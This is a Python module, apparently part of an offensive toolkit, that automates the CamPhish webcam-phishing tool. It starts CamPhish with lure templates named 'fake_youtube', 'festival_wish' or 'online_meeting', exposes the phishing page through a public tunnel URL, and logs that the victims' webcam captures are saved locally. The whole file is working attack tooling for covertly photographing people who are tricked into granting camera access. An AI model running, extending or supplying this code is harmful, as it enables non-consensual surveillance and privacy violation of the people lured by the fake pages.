import subprocess
import os
from pathlib import Path
from ..utils import load_config, save_result, timestamp
from ..tunnel.manager import get_public_url

cfg = load_config()
CAMPHISH_DIR = cfg["tool_paths"]["camphish"]

TEMPLATES = ["fake_youtube", "festival_wish", "online_meeting"]


def run(template: str = "fake_youtube", dry_run: bool = False) -> dict:
    script = str(Path(CAMPHISH_DIR) / "camphish.sh")

    if dry_run:
        data = {
            "module": "phishing.cam",
            "template": template,
            "dry_run": True,
            "timestamp": timestamp(),
            "status": "dry_run_ok",
            "script": script,
            "available_templates": TEMPLATES,
        }
        save_result("phishing_cam", data)
        return data

    proc = subprocess.Popen(
        ["bash", script],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        cwd=CAMPHISH_DIR,
    )
    try:
        proc.communicate(input="\n", timeout=20)
    except subprocess.TimeoutExpired:
        pass

    public_url = get_public_url()
    data = {
        "module": "phishing.cam",
        "template": template,
        "timestamp": timestamp(),
        "public_url": public_url,
        "pid": proc.pid,
        "note": "Webcam captures saved in CamPhish directory",
    }
    save_result("phishing_cam", data)
    return data
